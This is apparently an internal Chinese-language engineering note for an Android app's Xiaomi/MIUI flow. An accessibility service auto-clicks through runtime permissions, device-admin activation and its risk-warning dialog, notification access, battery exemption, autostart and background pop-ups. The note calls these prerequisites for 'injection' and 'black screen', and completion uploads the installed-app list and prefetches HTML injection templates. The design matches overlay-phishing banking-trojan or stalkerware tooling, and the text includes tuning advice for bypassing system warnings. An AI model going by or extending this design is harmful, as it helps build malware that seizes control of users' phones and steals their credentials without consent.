## 二、架构（`bd9b488a` 重构后）


## 三、小米六步：当前实现

| 步 | 目标 | 入口/页面 | 节奏 | 成功判据 |
|---|---|---|---|---|
| **Step1** | 9 项运行时权限 | `PermissionActivity`（透明载体）+ `PermissionClicker` | 0.8s 一轮（`DebugFlags.clickDelayMs` 可调，MIUI 下限 1200ms）；2s 后开点 | 按 view-id 优先 `permission_allow_button` / `allow_all` / `foreground_only` / `allow_selected`；**显式排除 `allow_one_time`**（进后台即回收）；文本兜底用完全相等 |
| **Step2** | 设备管理员 | `MiuiAdminActivity`（`startActivityForResult`，**不带 NEW_TASK**）→ 系统激活页 | 2s 后点「启用」→ 危险页：**2s 勾选 → 12s 点「确定」**→ 1.5s 回调 | 点完即结束，不再校验 DPM（`e4d4d1d6`） |
| **Step3** | 通知使用权 | `ACTION_NOTIFICATION_LISTENER_SETTINGS` | 4s 后开始 tick，1.5s 一轮，上限 40 轮（≈60s） | `isGranted` 读 `Settings.Secure.enabled_notification_listeners`（系统 ~10s 绑定延迟） |
| **Step4** | 电池策略「无限制」 | `ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS` → MIUI 转发到 `com.miui.powerkeeper/.ui.HiddenAppsConfigActivity` | 2s 后点第一项 | 回读 `isChecked/isSelected` |
| **Step5** | 自启动 | 写死 `com.miui.securitycenter/com.miui.permcenter.autostart.AutoStartManagementActivity`，开页 4 次×2s 重试 | 3s 后 tick，1.5s 一轮，上限 20 轮（≈30s） | 自己那一行右侧开关 `isChecked=true` |
| **Step6** | 后台弹出界面（MIUI 专属，注入/黑屏的前置条件） | `MiuiCarrierActivity`（透明载体，拉起应用信息后 1.2s 自杀）→ 其他权限 → 后台弹出界面 | 3s 后 tick，1.5s 一轮，上限 20 轮；stage0 其他权限 → stage1 后台弹出界面 → stage2 先点「始终允许」弹窗、否则点 CheckBox → stage3 回读 | `always allow` 选中 或 CheckBox 勾上 |

### 3.1 危险页（`MiuiNavigator.passRiskDialog`）

```kotlin
2s  → clickCheckbox()         // 先判 check_box 是否存在，不在就不点（避免点到下面的设置页）
12s → intercept_warn_allow 存在且 enabled → clickConfirm()（ACTION_CLICK，失败退 dispatchGesture 点中心）
+1.5s → onResult(ok)
```

`findCheckable` 有明确排除项：`Switch` / `ToggleButton` / id 含 `switch` 一律不算复选框 —— 之前误点过「love 快捷方式」开关（Step5 那类页面同源）。

### 3.2 载体 Activity 模式（MIUI 拦后台启动的解法）

| 载体 | 用途 | 关键点 |
|---|---|---|
| `MiuiAdminActivity` | 打开 `ADD_DEVICE_ADMIN` | `startActivityForResult(..., newTask = false)` —— 带 NEW_TASK 会让 DeviceAdminAdd 立即自杀；1.5s 后自己 finish |
| `MiuiCarrierActivity` | 打开应用信息页 | 透明主题、`exported=false`，1.2s 后 finish，后续点击交给 Step6 |

### 3.3 收尾（`OnboardingHooks.complete`，幂等）

`OnboardingState.markDone` → `sendAppListWhenReady()` → `InjectRepo.refresh(force=true)` → 2s 后 `prefetchAll()`（模板 HTML 预取，注入时秒开）。
服务侧另有 `hooksWatch` 5s 兜底：即使流程中途断掉，只要 `onboardingDone && !done` 也会补一次收尾（`de77b614`）。

## 四、当前断点：两个硬编码调试开关都开着

`flow/miui/MiuiFlow.kt:22-25`：

```kotlin
private const val SKIP_STEPS = true   // 跳过五步，只测注入
private const val TEST_STEP6 = true   // 只跑第六步
```

`start()` 里 `TEST_STEP6` 优先 → **现在任何方式构建出的包，打开无障碍后只跑 Step6（后台弹出界面），Step1–5 全跳过**，然后直接 `OnboardingHooks.complete()`。

所以：
- 手机上"能注入、能黑屏"是 **Step6 通了 + SKIP_STEPS** 的结果，不代表五步引导链路通；
- 要验证完整链路，必须先 `TEST_STEP6 = false`、`SKIP_STEPS = false`，或者把它们改成 gradle property（目前是 `const`，改完必须重新编译）。

这是当前唯一挡住"完整引导"的开关，不是代码缺失。

## 六、风险点 / 下一轮该动的地方

1. **出正式包前必须清零两个调试开关**，否则线上包不会走引导。建议改成 `prop("skipSteps", "false")` 之类，避免每次手改源码。
2. **危险页 12s 是写死的**：`fixedtiming / risktimer` 这几个包名说明已经踩过。慢机（弹窗 3s 才出）会错过 2s 勾选；快机白等 12s。改成"先轮询到 `intercept_warn_allow.enabled==true` 立刻点，12s 只作上限"更稳。
3. **Step4 没有显式指定 MIUI 组件**：走 `ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS` 靠 ROM 转发到 `HiddenAppsConfigActivity`。部分 HyperOS 版本会直接给 AOSP 白名单框（只有「允许/拒绝」），此时"点第一项无限制"会点空。注释里写的页面是实测的，但代码没锁组件。
4. **Step3 的 40 轮 ≈60s 有多半是白等**：系统绑定 `enabled_notification_listeners` 通常 3–10s，`isGranted` 已是 `Settings.Secure` 直读（`dd24a9c8` 修过缓存滞后），可以把轮询间隔降到 1s。
5. **Step5 写死 `com.miui.securitycenter`**：POCO/部分 HyperOS 的包名或 Activity 可能不同，值得加 `resolveActivity` 兜底 + `oem_profiles.json` 覆盖。
6. **Step6 的 stage2 有两套路径**（弹窗「始终允许」vs 页面 CheckBox），靠"先试文案再试组件"判，日志里要看 `点「始终允许」` 还是 `点开关 id=…` 才知道走的哪条 —— 排障时先看这行。
7. **`MiuiFlow` 类注释已过期**：注释还写"Step2 不点确定""只负责串流程两步"，实际已点确定、串五步。看代码别信注释。
8. **`docs/architecture.md` 第 6 节也过期**：写"小米流程当前到设备管理员为止"，实际六步都写完了。
